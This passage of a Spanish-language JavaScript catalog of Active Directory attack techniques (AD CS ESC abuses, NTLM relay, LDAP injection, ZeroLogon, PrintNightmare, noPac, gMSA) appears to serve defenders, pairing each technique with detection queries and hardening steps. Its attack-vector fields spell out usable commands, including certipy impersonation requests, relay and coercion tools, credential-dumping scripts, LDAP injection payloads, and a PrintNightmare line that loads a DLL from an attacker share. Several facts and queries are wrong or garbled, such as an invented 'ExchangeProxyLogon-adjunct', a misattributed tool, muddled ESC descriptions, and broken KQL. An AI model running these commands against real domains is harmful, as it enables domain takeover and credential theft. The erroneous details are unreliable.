      kql: 'SecurityEvent | where EventID == 5136 and AttributeLDAPDisplayName == "msDS-AllowedToActOnBehalfOfOtherIdentity" | project TimeGenerated, SubjectUserName, ObjectDN',
      spl: 'index=win EventCode=5136 msDS-AllowedToAct | stats count by user, object',
      win_event_ids: [5136, 5139],
    },
    mitigacion_hardening: ['Auditar quién puede escribir msDS-AllowedToActOnBehalfOfOtherIdentity en cada equipo', 'Proteger objetos computer contra GenericWrite (DACLs saneadas)', 'En el relay: LDAP signing + channel binding en DCs'],
    parcheo_remediacion: ['Revertir el atributo (quitar la cuenta atacante)', 'Forense del host objetivo (asumir dump de SAM/LSASS)', 'Rotar credenciales presentes en el host'],
    referencias: ['https://attack.mitre.org/techniques/T1550/005/', 'https://www.elliotkillick.com/genericwrite-rbcd/'],
  },
  {
    id: 'AD-016',
    nombre: 'AD CS ESC1 — plantilla con SAN y enrollment abierto',
    categoria: 'AD',
    severidad: 'Critical',
    mitre_attack: ['T1649', 'T1552'],
    descripcion_tecnica: 'La plantilla permite al solicitante definir el Subject Alternate Name (ENROLLEE_SUPPLIES_SUBJECT), el EKU permite autenticación de cliente (o Any Purpose), y hay derechos de enrollment para usuarios normales (o el flag de manager approval está off). El atacante pide un certificado como "administrator" → autenticación con ese cert (PKINIT/Schannel) = impersonación total.',
    impacto_iam_soc: 'Escalada a Domain Admin vía PKI. El certificado además es persistencia (valido meses/años) y sirve para autenticar a Entra ID si hay federación sync. Señal base: CertificateServicesClient-CertEnroll logs y requests de plantillas sensibles por usuarios sin privilegio (EventID 4886/5013 en el CA).',
    vector_ataque: ['certipy find -u user@corp -p pass -vulnerable (recon)', 'certipy req -u user@corp -p pass -ca CORP-CA -template VulnTemplate -upn administrator@corp.local', 'certipy auth -pfx administrator.pfx → TGT como administrator'],
    deteccion: {
      kql: 'SecurityEvent | where EventID in (4886, 4887) and (RequesterName !endswith "$" and CommonName != RequesterName) // SAN distinto del requester',
      spl: 'index=pki EventCode=4886 OR EventCode=4887 | stats count by requester, template, subject | where subject != requester',
      win_event_ids: [4886, 4887, 5013],
    },
    mitigacion_hardening: ['Remediar plantillas: CA manager approval ON, quitar ENROLLEE_SUPPLIES_SUBJECT salvo imprescindible, EKU específicos (no Any Purpose)', 'Enrollment restringido por grupos, no "Domain Users"', 'Auditar plantillas con certipy find / Locksmith — herramienta de Microsoft para detectar todas las ESC'],
    parcheo_remediacion: ['Revocar los certificados fraudulentos (certipy ca revoke / CA console)', 'Rotar krbtgt y auditar DA si hubo uso del cert', 'Revisar ADCS audit logs (4886-4890) por requests con SAN enriquecidos'],
    referencias: ['https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf', 'https://github.com/ly4k/Certipy'],
  },
  {
    id: 'AD-017',
    nombre: 'AD CS ESC2 — EKU Any Purpose / sin EKU',
    categoria: 'AD',
    severidad: 'Critical',
    mitre_attack: ['T1649'],
    descripcion_tecnica: 'Como ESC1 pero la plantilla tiene EKU = Any Purpose (2.5.29.37.0) o directamente SIN EKU. Un cert de este tipo sirve para CUALQUIER uso: client auth, server auth, code signing — todo. Con enrollment abierto para usuarios = para Dominio.',
    impacto_iam_soc: 'Certificados comodín semántico: impersonación de usuarios y además potencial firma de código. Doble daño: persistencia con autenticación y la posibilidad de firmar payloads que pasan SmartScreen/AppLocker (si el EKU code signing aplica).',
    vector_ataque: ['certipy req -template AnyPurpose -upn administrator', 'Uso del cert para PKINIT (impersonación) o firma'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4886 and TemplateName contains "AnyPurpose" or (EventID == 4886 and EKU == "")',
      spl: 'index=pki EventCode=4886 template="*any*" | stats count by requester',
      win_event_ids: [4886, 4887],
    },
    mitigacion_hardening: ['Eliminar EKUs Any Purpose / plantillas sin EKU con enrollment abierto', 'Same hardening que ESC1 (approval, restricción de enrollment)', 'Monitoreo continuo con Locksmith/certipy audit'],
    parcheo_remediacion: ['Revocar certs emitidos de esa plantilla', 'Auditar uso (4768 con certificado / SmartCard logons de usuarios raros)', 'Replantillar con EKU mínimo necesario'],
    referencias: ['https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf', 'https://github.com/GhostPack/Certify'],
  },
  {
    id: 'AD-018',
    nombre: 'AD CS ESC3 — Certificate Agent / enrollment agent',
    categoria: 'AD',
    severidad: 'High',
    mitre_attack: ['T1649'],
    descripcion_tecnica: 'Plantilla que emite certificados de "Enrollment Agent" (Certificate Request Agent EKU). Un enrollment agent puede solicitar certificados EN NOMBRE de otros usuarios hacia plantillas que requieren agent signature. Si un usuario normal puede obtener un cert de Enrollment Agent, se convierte en proxy de identidad de cualquiera.',
    impacto_iam_soc: 'Impersonación arbitraria con la bendición del CA. El cert se emite "oficialmente" con el nombre de la víctima. Detección: 4886 con RequesterName distinto del Subject en plantillas que aceptan enrollment agents.',
    vector_ataque: ['certipy req -template EnrollmentAgent → cert de agente', 'certipy req -template User -on-behalf-of \u0027domain\\administrator\u0027 -pfx agent.pfx'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4886 and Attribute contains "RequesterName" and RequesterName != SubjectCommonName',
      spl: 'index=pki EventCode=4886 | stats count by requester, subject | where requester != subject',
      win_event_ids: [4886, 4887],
    },
    mitigacion_hardening: ['Restringir quién puede ser Enrollment Agent (CA policy module: enrollment agents whitelist)', 'Revisar plantillas que aceptan certificados de agente (CA configuration)', 'Auditoría 4886 periódica'],
    parcheo_remediacion: ['Revocar certs de agente no autorizados', 'Reset de cuentas impersonadas', 'Reconfigurar el CA policy module'],
    referencias: ['https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf', 'https://www.thehacker.recipes/ad/movement/adcs'],
  },
  {
    id: 'AD-019',
    nombre: 'AD CS ESC4 — ACL vulnerable en plantilla',
    categoria: 'AD',
    severidad: 'Critical',
    mitre_attack: ['T1649', 'T1222'],
    descripcion_tecnica: 'La plantilla misma tiene una DACL que permite a usuarios normales modificarla (GenericAll/WriteDacl/WriteProperty). El atacante la reconfigura a lo ESC1 (SAN + EKU client auth + enrollment abierto), emite el cert malicioso y revierte la plantilla a su estado original para no dejar rastro.',
    impacto_iam_soc: 'Escalada con limpieza: la plantilla vuelve a su estado previo en minutos y las auditorías post-incidente no ven nada malo. Solo el log de cambios de DACL (5136 sobre la plantilla) delata la manipulación.',
    vector_ataque: ['certipy template -u user -p pass -template VulnACL -save-old', 'Reconfigurar a ESC1 → emitir cert como administrator → restaurar plantilla'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 5136 and ObjectClass == "pKICertificateTemplate" | project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName',
      spl: 'index=win EventCode=5136 objectClass=pKICertificateTemplate | stats count by user, attribute',
      win_event_ids: [5136],
    },
    mitigacion_hardening: ['Auditar DACLs de TODAS las plantillas y objetos del CA (Locksmith lo automatiza)', 'Ownership de plantillas solo para Domain Admins/Admins del CA', 'Alertar 5136 sobre cambios en pKICertificateTemplate fuera de ventanas de cambio'],
    parcheo_remediacion: ['Restaurar la DACL de la plantilla desde backup', 'Revocar certificados emitidos durante la ventana de modificación', 'Comparar configuración actual de plantillas contra baseline'],
    referencias: ['https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf', 'https://github.com/TrimarcJake/Locksmith'],
  },
  {
    id: 'AD-020',
    nombre: 'AD CS ESC5 — ACLs vulnerables en objetos PKI',
    categoria: 'AD',
    severidad: 'High',
    mitre_attack: ['T1649'],
    descripcion_tecnica: 'Cualquier objeto del ecosistema PKI con ACL floja sirve: el objeto CA (CN=CA en Configuration), el Enrollment Services container (ESC de container), el objeto de computadora del CA (ghost spn), el NtAuthCertificates store o incluso el dominio mismo. Controlando uno, se controla la PKI.',
    impacto_iam_soc: 'Vector PKI lateral: por ejemplo, escribir en el objeto computer del CA permite shadow credentials → control del CA → certs arbitrarios. NtAuthCertificates permite añadir una CA propia en la que el dominio confiará.',
    vector_ataque: ['Identificar ACLs flojas con Locksmith/certipy find', 'Shadow credentials sobre el objeto CA-server o nueva CA en NtAuthCertificates'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 5136 and (ObjectDN contains "Enrollment Services" or ObjectDN contains "NtAuthCertificates") | project TimeGenerated, SubjectUserName, ObjectDN',
      win_event_ids: [5136],
    },
    mitigacion_hardening: ['Auditar ACLs de todo el subtree CN=Public Key Services,CN=Services,CN=Configuration', 'Tier-0 treatment para el servidor CA y sus objetos', 'Alertas sobre cualquier cambio en NtAuthCertificates'],
    parcheo_remediacion: ['Restaurar ACLs/objetos modificados', 'Revisar certs en NtAuthCertificates contra baseline', 'Revocar confianza de CAs no autorizadas'],
    referencias: ['https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf', 'https://posts.specterops.io/certified-pre-owned-d95910965cd2'],
  },
  {
    id: 'AD-021',
    nombre: 'AD CS ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2',
    categoria: 'AD',
    severidad: 'Critical',
    mitre_attack: ['T1649'],
    descripcion_tecnica: 'Flag del CA (EDITF_ATTRIBUTESUBJECTALTNAME2) que hace que CUALQUIER plantilla acepte SAN especificado por el solicitante, aunque la plantilla no lo permita. Combinado con cualquier plantilla de usuario autenticable = ESC1 global. Microsoft eliminó el flag por defecto en mayo 2022.',
    impacto_iam_soc: 'Todas las plantillas se vuelven ESC1 de golpe. Un solo flag de configuración mal puesto = escala total. La mitigación real (KB5014754, mayo 2022) además añadió mapeo estricto de certificados.',
    vector_ataque: ['certutil -getreg policy\\EditFlags (recon)', 'certipy req -ca CORP-CA -template User -upn administrator@corp'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4886 and SubjectSAN != RequesterUPN // y auditar cambios en EditFlags del registry del CA (Sysmon 12/13 en HKLM\\SYSTEM\\CCS\\Services\\CertSvc)',
      win_event_ids: [4886],
    },
    mitigacion_hardening: ['certutil -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2 y reiniciar CertSvc', 'Instalar mayo 2022+ (KB5014754) — mapeo estricto de cuenta', 'Auditar EditFlags del CA en cada revisión'],
    parcheo_remediacion: ['Quitar el flag + reiniciar el servicio CA', 'Revocar certs emitidos con SAN especificado por requester', 'Parchear DCs y CA (mayo 2022)'],
    referencias: ['https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4270-8d29-51547d3b0f5a', 'https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-smart-objectives-97da261a6efc'],
  },
  {
    id: 'AD-022',
    nombre: 'AD CS ESC7 — CA admin rights (Issue and Manage CA)',
    categoria: 'AD',
    severidad: 'Critical',
    mitre_attack: ['T1649'],
    descripcion_tecnica: 'Si un usuario tiene los derechos de CA "Issue and Manage Certificates" (officer) o "Manage CA" (admin) sin ser admin real, puede aprobar requests pendientes (saltarse el manager approval de plantillas saneadas) o directamente reconfigurar el CA (retirar cualquier control).',
    impacto_iam_soc: 'ByPass de los controles del CA: el "manager approval" de ESC1 se neutraliza si el atacante es quien aprueba. Señal: 4887 (cert issued) aprobado por el mismo usuario que lo pidió (o aprobar requests en pending).',
    vector_ataque: ['certipy ca -u user -p pass -ca CORP-CA -list-officers (recon)', 'certipy req ... → pending request → certipy ca -issue-request <id> (self-approve)'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4887 and RequesterName == ApproverName // self-approval; también 4868/4872 (CA role changes)',
      win_event_ids: [4868, 4872, 4887],
    },
    mitigacion_hardening: ['Roles de CA (officer/admin) solo para grupo mínimo (CA Admins dedicados, Tier-0)', 'Auditar miembros de los roles del CA con certipy ca -list-officers', 'Alertar sobre aprobaciones donde requester == approver'],
    parcheo_remediacion: ['Revocar certs auto-aprobados', 'Quitar los roles de CA indebidos', 'Re-activar controles (manager approval) si fueron desactivados'],
    referencias: ['https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf', 'https://www.thehacker.recipes/ad/movement/adcs'],
  },
  {
    id: 'AD-023',
    nombre: 'AD CS ESC8 — NTLM relay a Web Enrollment',
    categoria: 'AD',
    severidad: 'Critical',
    mitre_attack: ['T1557', 'T1649'],
    descripcion_tecnica: 'La interface Web Enrollment del CA (/certsrv/) acepta autenticación NTLM. Coaccionando (PetitPotam/PrinterBug) a un DC o usuario privilegiado a autenticarse contra un servidor del atacante, se relaya el NTLM al /certsrv/ del CA y se emite un certificado como la víctima (incl. el DC → Golden). No requiere credenciales previas.',
    impacto_iam_soc: 'De cero a Domain Admin sin una sola password: coercion + relay + cert = impersonación del DC. Cadena típica: PetitPotam → ntlmrelayx → /certsrv → cert del DA/DC → DCSync. Es el vector del famoso ExchangeProxyLogon-adjunct y de ataques reales 2021-2024.',
    vector_ataque: ['ntlmrelayx.py -t https://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs', 'PetitPotam.py atacante@ca.corp.local (coerción del DC)', 'gettgtpkinit.py con el .pfx del DC'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4624 and LogonType == 3 and ProcessName contains "certsrv" // logons hacia IIS del CA; IIS logs en /certsrv con NTLM auth; Sysmon 3 (conexiones al listener atacante)',
      sigma: 'win_adcs_web_enrollment_ntlm_relay',
      win_event_ids: [4624, 4768],
    },
    mitigacion_hardening: ['Deshabilitar el Web Enrollment (HTTP) del CA si no se usa (hoy casi nadie lo necesita): uninstall AD CS Web Enrollment role', 'NTLM relay defenses: EPA (Extended Protection) en IIS, Require SSL + cert auth en /certsrv', 'Bloquear coercion: SMB signing everywhere, firewalls de tráfico 135/445 entre estaciones'],
    parcheo_remediacion: ['Quitar Web Enrollment del CA', 'Revocar certs emitidos vía certfnsh.asp en la ventana', 'Rotar krbtgt si el cert era del DC'],
    referencias: ['https://research.ifcr.dk/relaying-to-ad-certificate-services-privilege-escalation-f0925d0e6e2', 'https://github.com/topotam/PetitPotam'],
  },
  {
    id: 'AD-024',
    nombre: 'AD CS ESC9-ESC16 — técnicas nuevas (no SAN, weak mapping, relay ICPR, template/ACL shells)',
    categoria: 'AD',
    severidad: 'High',
    mitre_attack: ['T1649'],
    descripcion_tecnica: 'Familia posterior a Certified Pre-Owned: ESC9 (nuevo flag STRONG_ISSUER / no-security-extension abuso con certificados sin la extensión SAN), ESC10 (weak certificate mapping por UPN en el Subject vs SAN — modo flag del KB5014754), ESC11 (relay al servicio ICPR del CA), ESC12 (shell access al CA con YubiHSM), ESC13 (plantillas ligadas a grupos de AD vía issuance policy OID), ESC14 (wildcards en el Subject de plantillas NTLM mapping), ESC15 (EKU en el template name — templates CVE-2024-49019 "vulnerable template names"), ESC16 (security extension disabled en plantillas de autenticación).',
    impacto_iam_soc: 'Bypasses de los fixes de 2022 (KB5014754) y nuevas rutas de impersonación sin SAN. Concreto: ESC10/ESC16 permiten que el certificado se mapee a una cuenta equivocada; ESC13 escala vía grupo ligado a la plantilla; ESC15 abusa de cómo se parsean los nombres de plantilla en ArkID/Microsoft CA.',
    vector_ataque: ['certipy find -vulnerable (detecta ESC9-ESC16)', 'ESC10: cert con UPN en Subject (no SAN) → mapeo NTLM débil', 'ESC11: ntlmrelayx -t rpc://ca.corp.local (ICPR relay)'],
    deteccion: {
      kql: 'SecurityEvent | where EventID in (4886, 4887) and SubjectSAN != "" and SubjectSAN != RequesterUPN // auditar mapeos; ICPR: eventos RPC en CA (Sysmon 3 hacia el CA en puerto 135)',
      win_event_ids: [4886, 4887],
    },
    mitigacion_hardening: ['Aplicar KB5014754 en modo Full Enforcement (no compat)', 'Locksmith para auditar ESC1-ESC16 continuamente', 'Deshabilitar templates no usados; el 90% de entornos tiene decenas sin uso'],
    parcheo_remediacion: ['Parchear CA y DCs (nov 2024: CVE-2024-49019 ESC15)', 'Corregir configuraciones flag de CA y plantillas', 'Revocar certs mal mapeados'],
    referencias: ['https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-smart-objectives-97da261a6efc', 'https://github.com/ly4k/Certipy', 'https://github.com/TrimarcJake/Locksmith'],
  },
  {
    id: 'AD-025',
    nombre: 'NTLM Relay + LLMNR/NBT-NS poisoning (Responder)',
    categoria: 'AD',
    severidad: 'High',
    mitre_attack: ['T1557.001', 'T1550.002'],
    descripcion_tecnica: 'LLMNR/NBT-NS (resolución de nombres legacy) permiten a cualquiera en la VLAN responder a queries de nombres con typos ("fileshr01" → "fileserver01"). El atacante captura el NTLM challenge-response y lo RELAYA (si SMB signing off) a otro host, autenticándose como la víctima sin necesidad de crackear el hash.',
    impacto_iam_soc: 'Base de multitud de cadenas: relay a SMB (ejecución), LDAP (RBCD/ESC), AD CS (ESC8). El usuario ni se entera (su explorer reintenta). Detección: tráfico LLMNR/NBT-NS en sí mismo es la señal (debería estar muerto), y 4624 tipo 3 con NTLM cruzando hosts.',
    vector_ataque: ['Responder.py -I eth1 -dwv (captura y poisoning)', 'ntlmrelayx.py -tf smb://target --no-smb2support (relay sin firma)', 'mitm6 (DHCPv6 → WPAD → relay)'],
    deteccion: {
      kql: 'DeviceNetworkEvents | where RemotePort == 5355 or RemotePort == 137 | summarize count() by DeviceId, RemotePort // tráfico LLMNR/NBT-NS',
      spl: 'index=network dest_port=5355 OR dest_port=137 | stats count by src, dest',
      sigma: 'win_llmnr_nbtns_poisoning',
      win_event_ids: [4624],
    },
    mitigacion_hardening: ['Deshabilitar LLMNR y NBT-NS por GPO (hoy es best practice universal)', 'SMB signing obligatorio en todos los hosts (GPO Microsoft network server/client: digitally sign)', 'LDAP signing + LDAPS channel binding en DCs; Extended Protection en IIS'],
    parcheo_remediacion: ['Bloquear el host atacante', 'Rotar credenciales de los usuarios relayed', 'Auditar acciones realizadas bajo las sesiones relayed (4624 tipo 3 correlacionado)'],
    referencias: ['https://attack.mitre.org/techniques/T1557/001/', 'https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/resolve-names-using-llmnr-and-nbt-ns'],
  },
  {
    id: 'AD-026',
    nombre: 'LDAP injection',
    categoria: 'AD',
    severidad: 'High',
    mitre_attack: ['T1190'],
    descripcion_tecnica: 'Inputs de búsqueda de usuarios que se concatenan en filtros LDAP sin escapar ("(sAMAccountName=" + input + ")"). Con asteriscos y paréntesis se puede: enumerar usuarios/atributos byte a byte (blind LDAPi), bypasear búsquedas de login y en Windows AD leer atributos arbitrarios.',
    impacto_iam_soc: 'Enumeración de usuarios/grupos de AD vía la propia app corporativa (portales de búsqueda interna, sistemas legacy). En escenarios de AUTH LDAP directo, bypass de autenticación ("*" → match cualquiera). Prepara password sprays.',
    vector_ataque: ['Input *)(sAMAccountName=administrator) en buscadores', 'Blind extraction: a* / b* para enumerar atributos letra a letra', 'Bypass de login LDAP: user)(|(objectClass=*)'],
    deteccion: {
      spl: 'index=web uri="*search*" | regex query="[*()\\|=&]" | stats count by src, query',
    },
    mitigacion_hardening: ['Escapar caracteres LDAP (\\ * ( ) NUL) con librerías estándar antes de construir filtros', 'Usar binds parametrizados/consultas predefinidas', 'Rate limit y monitoreo de queries con wildcards múltiples'],
    parcheo_remediacion: ['Parchear las apps con LDAP dinámico', 'Auditar logs por enumeración histórica (patrones a*/b*)', 'Restringir el usuario de bind de la app a un subtree mínimo (no Domain Readers)'],
    referencias: ['https://owasp.org/www-community/attacks/LDAP_Injection', 'https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html'],
  },
  {
    id: 'AD-027',
    nombre: 'GPP cpassword en SYSVOL (CVE-2014-1812)',
    categoria: 'AD',
    severidad: 'Critical',
    cve_ejemplo: ['CVE-2014-1812'],
    mitre_attack: ['T1552.001', 'T1552.006'],
    descripcion_tecnica: 'Group Policy Preferences guardaban passwords cifradas con una clave AES estática PUBLICADA por Microsoft en MSDN. Todo dominio con GPP legacy tiene passwords de admins locales (y otras) recuperables por CUALQUIER usuario autenticado leyendo SYSVOL.',
    impacto_iam_soc: 'Passwords de admin local (a veces DA de mantenimiento) en texto claro para cualquier usuario del dominio. A pesar del MS14-025 (2014), entornos con GPP viejos sin limpiar siguen apareciendo cada semana en pentests.',
    vector_ataque: ['findstr /S cpassword \\\\corp\\sysvol\\*.xml', 'gpp-decrypt <blob> (o Get-GPPPassword de PowerView)'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 5145 and RelativeTargetName endswith ".xml" and ShareName contains "SYSVOL" // lectura de xml de GPP por usuarios no-admin',
      spl: 'index=win EventCode=5145 share="*SYSVOL*" file="*.xml" | stats count by user, file | where user NOT IN (admins)',
      win_event_ids: [5145],
    },
    mitigacion_hardening: ['Eliminar TODOS los GPP con cpassword (Group Policy Management → Items con passwords)', 'LAPS moderno (Windows LAPS 2023+) en lugar de GPP para passwords locales', 'Escaneos periódicos de SYSVOL buscando cpassword='],
    parcheo_remediacion: ['Rotar TODAS las passwords que aparecieron en GPP (asumir comprometidas)', 'Borrar los archivos XML del SYSVOL', 'Auditar accesos históricos a esos archivos (5145)'],
    referencias: ['https://attack.mitre.org/techniques/T1552/006/', 'https://learn.microsoft.com/en-us/troubleshoot/windows-server/group-policy/gpp-password-storage-and-use'],
  },
  {
    id: 'AD-028',
    nombre: 'DACLs peligrosas (GenericAll/WriteDacl/ForceLdapChangePassword…)',
    categoria: 'AD',
    severidad: 'High',
    mitre_attack: ['T1222', 'T1098'],
    descripcion_tecnica: 'Derechos excesivos sobre objetos AD: GenericAll sobre un usuario (reset password), WriteDacl (auto-otorgarse derechos), WriteOwner (tomar el objeto), AllExtendedRights (reset password sin ser admin), GenericWrite (shadow credentials/script path). BloodHound los expone como paths de escalada.',
    impacto_iam_soc: 'Es la categoría de hallazgo más común en AD: delegaciones de soporte de hace 10 años ("helpdesk puede resetear passwords") que en realidad otorgan control sobre cuentas DA. Invisible sin herramientas de análisis de ACLs.',
    vector_ataque: ['BloodHound shortest paths: GenericAll → user → DA', 'Set-DomainUserPassword con AllExtendedRights', 'GenericWrite → msDS-KeyCredentialLink (shadow creds)'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4724 (reset), 5136 (DACL change), 4728/4732 (group add) | where SubjectUserName != TargetUserName // y correlacionar contra flujos aprobados (ticketing)',
      spl: 'index=win (EventCode=4724 OR EventCode=5136 OR EventCode=4728) | stats count by src_user, target_user',
      win_event_ids: [4724, 4728, 4732, 5136],
    },
    mitigacion_hardening: ['BloodHound (o la herramienta Attack Path de MS Entra) mapping quarterly de todos los paths a DA/krbtgt', 'Deshabilitar delegación de permisos salvo procesos IT documentados (JIT/PAM con aprobación)', 'Tier model: nunca delegar sobre Tier-0 (DA, EA, DCs, CA)'],
    parcheo_remediacion: ['Saneación de ACLs: quitar ACEs excesivas (herramientas: AD ACL Scanner, Set-ADACL)', 'Reset de las cuentas controladas', 'Hunt de 4724/5136 históricos desde el principal con la DACL floja'],
    referencias: ['https://attack.mitre.org/techniques/T1222/', 'https://specterops.io/_assets/resources/SpecterOps_Hierarchy_Power.pdf'],
  },
  {
    id: 'AD-029',
    nombre: 'ZeroLogon (CVE-2020-1472)',
    categoria: 'AD',
    severidad: 'Critical',
    cve_ejemplo: ['CVE-2020-1472'],
    mitre_attack: ['T1210', 'T1550.002'],
    descripcion_tecnica: 'El bug del protocolo Netlogon (MS-NRPC) permite establecer la sesión segura con client challenge de 8 bytes a cero → se resetea la password de la cuenta del DC (vacía) → DCSync total del dominio. Explotación en segundos, sin credenciales previas, desde la red.',
    impacto_iam_soc: 'Domain Admin sin credenciales en un solo request. Marcó 2020-2021 (ataques ransomware masivos). Hoy parcheado en casi todos lados, pero los DCs sin agosto 2020+ siguen apareciendo. Señal: eventos 2212/5827-5831 de Netlogon (rejected secure channel) en el DC.',
    vector_ataque: ['zerologon_tester.py dc.corp.local (verificar)', 'Set password vacía → secretsdump.py → golden ticket'],
    deteccion: {
      kql: 'SecurityEvent | where EventID in (5827, 5828, 5829, 5830, 5831, 2212) // Netlogon secure channel enforcement events',
      spl: 'index=dc EventCode=5827 OR EventCode=5829 | stats count by src',
      sigma: 'win_zerologon_netlogon',
      win_event_ids: [5827, 5829, 2212],
    },
    mitigacion_hardening: ['Parchear TODOS los DCs (agosto 2020 en adelante) — la mitigación Forcing audit mode primero, luego enforce', 'Verificar con el script oficial de prueba Secura (zerologon_tester)', 'NO confiar solo en el parche: auditar devices NVLOGON (legacy) que rompen al forzar'],
    parcheo_remediacion: ['Restaurar la password de la cuenta del DC (reinstall o Reset-ComputerMachinePassword)', 'Rotar krbtgt dos veces (el atacante hizo DCSync)', 'Forense completo: es un compromiso total'],
    referencias: ['https://www.secura.com/blog/zerologon', 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472'],
  },
  {
    id: 'AD-030',
    nombre: 'PrintNightmare (CVE-2021-1675 / CVE-2021-34527)',
    categoria: 'AD',
    severidad: 'Critical',
    cve_ejemplo: ['CVE-2021-1675', 'CVE-2021-34527'],
    mitre_attack: ['T1068', 'T1547'],
    descripcion_tecnica: 'El Print Spooler permite a usuarios autenticados instalar drivers de impresora con DLL arbitraria → SYSTEM en el DC si el spooler está activo. CVE-2021-34527 con constraints de Point&Print flojos permite además ejecución remota sin autenticación en algunos escenarios.',
    impacto_iam_soc: 'Escalada local → SYSTEM → dump de creds → DA. El spooler activo en DCs fue el "regalo" de 2021. Detalle: sigue habiendo variantes (Follina-adjacent, que se abusa con RPRN). Rendimiento de regla de Sigma: instalación de drivers desde rutas UNC.',
    vector_ataque: ['whoami /priv (Spooler activo?): Get-Service Spooler', 'PrintNightmare.py corp.local/user:pass@dc -dll \\\\atacante\\share\\evil.dll'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 316 (Microsoft-Windows-PrintService/Admin) or EventID in (808, 354) // driver install; Sysmon 3: conexión a UNC en 445 durante instalación de driver',
      spl: 'index=win sourcetype=PrintServiceAdmin EventCode=316 | stats count by user, driver',
      sigma: 'win_printnightmare_printspooler',
      win_event_ids: [316, 808],
    },
    mitigacion_hardening: ['Parar y deshabilitar el Print Spooler en DCs y servidores que no imprimen (GPO)', 'Parches de junio 2021+ y julio 2021+ (Point&Print Hardening)', 'RestrictDriverInstallationToAdministrators = 1 (post 2021 hardening)'],
    parcheo_remediacion: ['Parchear todos los hosts con spooler', 'Forense del DC si se explotó', 'Rotar credenciales dumpeadas'],
    referencias: ['https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527', 'https://github.com/cube0x0/CVE-2021-1675'],
  },
  {
    id: 'AD-031',
    nombre: 'noPac (sAMAccountName spoofing CVE-2021-42278/42287)',
    categoria: 'AD',
    severidad: 'Critical',
    cve_ejemplo: ['CVE-2021-42278', 'CVE-2021-42287'],
    mitre_attack: ['T1484', 'T1210'],
    descripcion_tecnica: 'Bug que permitía renombrar una cuenta de computadora a un nombre de DC (sin $), obtener un TGT, borrar la cuenta y hacer que el KDC buscase la cuenta en el dominio con nombre de DC → ticket emitido como el DC → DA. Cadena completa sin parche de octubre/diciembre 2021.',
    impacto_iam_soc: 'Escalada de cualquier usuario a Domain Admin con la cuenta de una computadora controlada. Apareció explotada activamente en ransomware. Señal: eventos 4781 (cambio de nombre de cuenta de computadora) con patrones raros.',
    vector_ataque: ['noPac.py corp.local/user:pass -dc-ip dc -use-ldap (scan+exploit)', 'Renombrar máquina → TGT → borrar → PAC del DC'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4781 and OldTargetUserName !endswith "$" and TargetUserName !endswith "$" // renombrados de máquina a nombre sin $',
      spl: 'index=win EventCode=4781 | where new_name LIKE "DC%" AND new_name NOT LIKE "%$"',
      sigma: 'win_nopac_samaccountname_spoof',
      win_event_ids: [4781, 4742],
    },
    mitigacion_hardening: ['Parches KB5008102 (nov 2021) y KB5008380 (dic 2021) en TODOS los DCs — los dos son necesarios', 'Auditar renombrados de cuentas de computadora (4781)', 'Restringir quién puede unir equipos al dominio (mínimo necesario)'],
    parcheo_remediacion: ['Parchear DCs', 'Auditar cuentas de máquina renombradas/borradas recientemente', 'Rotar krbtgt si hay explotación confirmada'],
    referencias: ['https://support.microsoft.com/en-us/topic/kb5008102-active-directory-security-accounts-manager-store-sam-cve-2021-42278-5945b357-afdd-415e-9afb-6134c6c0117f', 'https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-336a'],
  },
  {
    id: 'AD-032',
    nombre: 'gMSA password readable (principalsAllowedToRetrieveManagedPassword)',
    categoria: 'AD',
    severidad: 'High',
    mitre_attack: ['T1555.004'],
    descripcion_tecnica: 'Las Group Managed Service Accounts rotan su password automática, pero cualquier principal listado en principalsAllowedToRetrieveManagedPassword puede LEERLA (msds-ManagedPassword). Si la lista incluye grupos amplios (Domain Computers, todos los admins de un equipo), el secreto es accesible.',
    impacto_iam_soc: 'Compromiso de service accounts "seguras" (SQL, IIS, schedulers): la password rotativa es legible por cualquier host listado. BloodHound 4.4+ mapea estos edges. La password extraída da Kerberos auth completa como la gMSA (a menudo privilegiada).',
    vector_ataque: ['Get-ADServiceAccount svc_sql -Properties PrincipalsAllowedToRetrieveManagedPassword (recon)', 'gMSADumper.py -u user -p pass -d corp.local → NTLM hash de la gMSA'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4769 and ServiceName startswith "svc_" and IpAddress not in (allowed_hosts) // uso de la gMSA desde hosts no esperados; LDAP: lecturas del attribute msds-ManagedPassword (4662 en objetos gMSA)',
      win_event_ids: [4769, 4662],
    },
    mitigacion_hardening: ['PrincipalsAllowedToRetrieveManagedPassword = SOLO los hosts que ejecutan el servicio', 'Auditar el atributo en todas las gMSA y reducirlo', 'Hunt: eventos 4662 lectura del msds-ManagedPassword fuera de los hosts permitidos'],
